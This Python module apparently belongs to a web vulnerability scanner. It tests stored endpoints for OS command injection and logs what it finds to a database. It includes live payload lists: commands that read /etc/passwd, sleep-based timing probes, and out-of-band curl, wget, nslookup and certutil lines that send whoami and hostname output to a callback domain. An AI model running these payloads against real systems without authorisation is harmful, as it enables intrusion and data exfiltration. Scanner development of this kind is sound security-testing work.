import json
import os
import requests
import sqlite3
import time
import copy
from urllib.parse import urljoin
import warnings
warnings.filterwarnings('ignore')

# Docker networking: translate localhost URLs to host.docker.internal
_IN_DOCKER = os.environ.get('RUNNING_IN_DOCKER', '0') == '1'

def _docker_translate_url(url: str) -> str:
    if not _IN_DOCKER:
        return url
    url = url.replace('://localhost', '://host.docker.internal')
    url = url.replace('://127.0.0.1', '://host.docker.internal')
    return url

def _docker_reverse_url(url: str) -> str:
    """Reverse Docker URL translation for display/storage."""
    if not url:
        return url
    return url.replace('://host.docker.internal', '://localhost')

DB_PATH = "niledefender.db"

RUN_VERBOSE    = True
RUN_TIME_BASED = True
RUN_OOB        = True
CALLBACK_DOMAIN = "your-collaborator.oastify.com"

INTERESTING_KEYS = [
    "value", "cmd", "command", "exec", "query", "param",
    "host", "ip", "filename", "file", "name", "path",
    "data", "input", "target", "url", "domain", "addr",
    "action", "run", "script", "bin", "dir", "home"
]

VERBOSE_COMMANDS = [
    "id", "whoami", "uname -a", "hostname", "cat /etc/passwd",
    "ls -la /home", "ifconfig", "ipconfig /all", "dir C:\\",
    "type C:\\Windows\\win.ini", "systeminfo", "net user"
]

TIME_PAYLOADS = [
    {"cmd": "sleep 5", "delay": 5, "os": "Linux"},
    {"cmd": "ping -c 5 127.0.0.1", "delay": 4, "os": "Linux"},
    {"cmd": "ping -n 5 127.0.0.1", "delay": 4, "os": "Windows"},
    {"cmd": "timeout /t 5", "delay": 5, "os": "Windows"}
]

OOB_COMMANDS = [
    "nslookup $(whoami).{domain}",
    "nslookup $(hostname).{domain}",
    "curl http://{domain}?d=$(whoami)",
    "wget http://{domain}?d=$(hostname) -O /dev/null",
    "nslookup %USERDOMAIN%.{domain}",
    "certutil -urlcache -f http://{domain}?d=%COMPUTERNAME% nul"
]

OPERATORS          = [";", "&&", "||", "|"]
OPERATORS_EXTENDED = [";", "&&", "||", "|", "`", "$()", "\n", "&"]


# ============================================================
#  HELPER FUNCTIONS
# ============================================================

def flatten_json(obj, parent_path=()):
    if isinstance(obj, dict):
        for k, v in obj.items():
            yield from flatten_json(v, parent_path + (k,))
    elif isinstance(obj, list):
        for idx, item in enumerate(obj):
            yield from flatten_json(item, parent_path + (idx,))
    elif isinstance(obj, str):
        yield parent_path, obj

def get_nested_value(obj, path):
    for key in path:
        obj = obj[key]
    return obj

def set_nested_value(obj, path, value):
    for key in path[:-1]:
        obj = obj[key]
    obj[path[-1]] = value

def is_injectable_path(path):
    if not path:
        return False
    last_key = str(path[-1]).lower()
    return any(interesting in last_key for interesting in INTERESTING_KEYS)

def is_verbose_success(response, command):
    indicators = [
        "uid=", "gid=", "groups=",
        "root", "daemon",
        "Linux", "Windows",
        "drwx", "total ",
        "/bin/", "/usr/",
        "C:\\Windows",
        "inet addr", "inet ",
        "eth0", "lo",
        "BYTES",
        "Microsoft", "All Users",
        "/root", "/home",
    ]
    resp_text = response.text.lower()
    for ind in indicators:
        if ind.lower() in resp_text:
            return True
    if len(response.text) > 500:
        return True
    return False


# ============================================================
#  INJECTION TEST FUNCTIONS
# ============================================================

def test_verbose_injection(url, method, body_params, headers, path):
    original_body = copy.deepcopy(body_params)
    leaf_value = get_nested_value(original_body, path)

    print(f"    [*] Verbose test on: {path} = '{leaf_value}'")

    for cmd in VERBOSE_COMMANDS:
        for op in OPERATORS_EXTENDED:
            injection = f"{leaf_value}{op} {cmd}"
            test_body = copy.deepcopy(original_body)
            set_nested_value(test_body, path, injection)

            try:
                if method.upper() == "POST":
                    resp = requests.post(url, json=test_body, headers=headers, timeout=5)
                elif method.upper() == "PUT":
                    resp = requests.put(url, json=test_body, headers=headers, timeout=5)
                else:
                    resp = requests.get(url, params=test_body, headers=headers, timeout=5)

                if is_verbose_success(resp, cmd):
                    print(f"    ✅ VERBOSE SUCCESS!")
                    print(f"       Path: {path}, Operator: '{op}', Command: '{cmd}'")
                    print(f"       Response snippet: {resp.text[:200]}")
                    return True, cmd, op, resp

            except requests.exceptions.Timeout:
                print(f"    [!] Request timeout (potential success)")
            except Exception:
                continue

    print(f"    ❌ No verbose injection found at {path}")
    return False, None, None, None


def test_blind_time_based(url, method, body_params, headers, path):
    original_body = copy.deepcopy(body_params)
    leaf_value = get_nested_value(original_body, path)

    print(f"    [*] Time-based blind test on: {path} = '{leaf_value}'")

    for payload in TIME_PAYLOADS:
        for op in OPERATORS:
            injection = f"{leaf_value}{op} {payload['cmd']}"
            test_body = copy.deepcopy(original_body)
            set_nested_value(test_body, path, injection)

            try:
                start = time.time()
                if method.upper() == "POST":
                    resp = requests.post(url, json=test_body, headers=headers, timeout=10)
                elif method.upper() == "PUT":
                    resp = requests.put(url, json=test_body, headers=headers, timeout=10)
                else:
                    resp = requests.get(url, params=test_body, headers=headers, timeout=10)
                elapsed = time.time() - start

                if elapsed >= payload['delay']:
                    print(f"    ✅ BLIND (TIME) SUCCESS!")
                    print(f"       Path: {path}, OS: {payload['os']}, Operator: '{op}'")
                    print(f"       Command: '{payload['cmd']}', Delay: {elapsed:.2f}s")
                    return True, payload['cmd'], op, elapsed

            except requests.exceptions.Timeout:
                print(f"    ✅ BLIND (TIME) SUCCESS - Timeout!")
                print(f"       Path: {path}, Operator: '{op}', Command: '{payload['cmd']}'")
                return True, payload['cmd'], op, 'timeout'
            except Exception:
                continue

    print(f"    ❌ No time-based injection found at {path}")
    return False, None, None, None


def test_blind_oob(url, method, body_params, headers, path, callback_domain):
    original_body = copy.deepcopy(body_params)
    leaf_value = get_nested_value(original_body, path)

    print(f"    [*] OOB blind test on: {path} = '{leaf_value}'")
    print(f"    [*] Callback domain: {callback_domain}")

    for cmd_template in OOB_COMMANDS:
        cmd = cmd_template.replace("{domain}", callback_domain)
        for op in OPERATORS_EXTENDED:
            injection = f"{leaf_value}{op} {cmd}"
            test_body = copy.deepcopy(original_body)
            set_nested_value(test_body, path, injection)

            try:
                if method.upper() == "POST":
                    requests.post(url, json=test_body, headers=headers, timeout=3)
                elif method.upper() == "PUT":
                    requests.put(url, json=test_body, headers=headers, timeout=3)
                else:
                    requests.get(url, params=test_body, headers=headers, timeout=3)
            except Exception:
                pass

    print(f"    [!] OOB payloads sent. Check your collaborator for callbacks!")
    return False, None, None, None


# ============================================================
#  TARGET LOADING FROM DATABASE
# ============================================================

def get_targets(db_path=None, scan_id=None):
    db = db_path or DB_PATH
    if not os.path.exists(db):
        print(f"DB not found: {db}"); return []
    targets = []
    try:
        with sqlite3.connect(db) as conn:
            conn.row_factory = sqlite3.Row
            if scan_id:
                rows = conn.execute("SELECT id, url, method, parameters, body_params, extra_headers FROM endpoints WHERE scan_id = ? AND url LIKE '%command%'", (scan_id,))
            else:
                rows = conn.execute("SELECT id, url, method, parameters, body_params, extra_headers FROM endpoints WHERE url LIKE '%command%'")
            for row in rows:
                ep_id       = row["id"]
                url         = _docker_translate_url(row["url"])
                method      = (row["method"] or "GET").upper()
                body_params = json.loads(row["body_params"]) if row["body_params"] else {}
                headers     = json.loads(row["extra_headers"]) if row["extra_headers"] else {}
                targets.append((ep_id, url, method, body_params, headers))
    except Exception as e:
        print(f"DB Error: {e}"); return []
    return targets


# ============================================================
#  SCAN ONE ENDPOINT
# ============================================================

def scan_target(target, scan_id: int, db_path=None, cookie=None, on_progress=None, cancel_check=None):
    db = db_path or DB_PATH
    ep_id, url, method, body_params, headers = target

    if cookie:
        headers["Cookie"] = cookie

    if not body_params:
        print(f"  ⚠️  No body parameters in endpoint {ep_id}. Skipping.")
        return

    results = {"verbose": [], "blind_time": [], "oob": []}

    for path, original_value in flatten_json(body_params):
        if not is_injectable_path(path):
            continue

        if cancel_check and cancel_check():
            if on_progress:
                on_progress("Scan cancelled — stopping")
            return

        print(f"\n{'─'*60}")
        print(f"🔎 Testing path: {path}  (value: '{original_value}')")

        if RUN_VERBOSE:
            success, cmd, op, resp = test_verbose_injection(url, method, body_params, headers, path)
            if success:
                results["verbose"].append({"path": path, "command": cmd, "operator": op})
                _save_finding(scan_id, url, method, str(path), f"{op} {cmd}",
                              "Verbose", "High", resp.text[:500] if resp else "", db)

        if RUN_TIME_BASED:
            success, cmd, op, detail = test_blind_time_based(url, method, body_params, headers, path)
            if success:
                results["blind_time"].append({"path": path, "command": cmd, "operator": op, "delay": detail})
                _save_finding(scan_id, url, method, str(path), f"{op} {cmd}",
                              "Blind (Time-based)", "High", f"Delay: {detail}", db)

        if RUN_OOB:
            test_blind_oob(url, method, body_params, headers, path, CALLBACK_DOMAIN)
            results["oob"].append({"path": path})

    return results


# ============================================================
#  SAVE TO DATABASE
# ============================================================

def _save_finding(scan_id, url, method, parameter, payload, vuln_subtype, severity, evidence, db_path):
    for attempt in range(5):
        try:
            with sqlite3.connect(db_path, timeout=10) as conn:
                conn.execute("PRAGMA journal_mode=WAL")
                conn.execute(
                    """INSERT OR IGNORE INTO vulnerabilities
                    (scan_id, vulnerability_type, severity, url, method, parameter, payload, evidence, vulnerability_data, discovered_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (scan_id, f"Command Injection ({vuln_subtype})", severity, _docker_reverse_url(url), method,
                     parameter, payload, evidence, vuln_subtype,
                     time.strftime("%Y-%m-%d %H:%M:%S")),
                )
                conn.commit()
            return
        except sqlite3.OperationalError:
            time.sleep(0.5 * (attempt + 1))
    print(f"[DB ERROR] Failed after 5 attempts: {url}")


# ============================================================================
# HIGH-LEVEL API — called from server.py
# Same interface as run_sqli_scan(scan_id, db_path, on_progress, cookie)
# ============================================================================

def run_cmdi_scan(scan_id, db_path, on_progress=None, cookie=None, cancel_check=None):
    if on_progress:
        on_progress("Starting Command Injection scan...")

    targets = get_targets(db_path=db_path, scan_id=scan_id)

    if not targets:
        msg = "No command-related targets found for this scan."
        print(msg)
        if on_progress:
            on_progress(msg)
        return {"targets_scanned": 0, "vulnerabilities_found": 0}

    msg = f"Found {len(targets)} potential Command Injection targets"
    print(msg)
    if on_progress:
        on_progress(msg)

    scanned_count = 0

    for i, target in enumerate(targets, 1):
        if cancel_check and cancel_check():
            if on_progress:
                on_progress("Scan cancelled — stopping")
            break

        scanned_count += 1
        if on_progress:
            on_progress(f"Scanning target {scanned_count}/{len(targets)}: {target[1][:80]}")

        scan_target(target, scan_id=scan_id, db_path=db_path, cookie=cookie,
                    on_progress=on_progress, cancel_check=cancel_check)

    vuln_count = 0
    try:
        with sqlite3.connect(db_path) as conn:
            vuln_count = conn.execute(
                "SELECT COUNT(*) FROM vulnerabilities WHERE scan_id = ? AND vulnerability_type LIKE 'Command Injection%'",
                (scan_id,)
            ).fetchone()[0]
    except Exception:
        pass

    summary = f"Command Injection scan complete: {scanned_count} targets scanned, {vuln_count} vulnerabilities found"
    print(summary)
    if on_progress:
        on_progress(summary)

    return {"targets_scanned": scanned_count, "vulnerabilities_found": vuln_count}
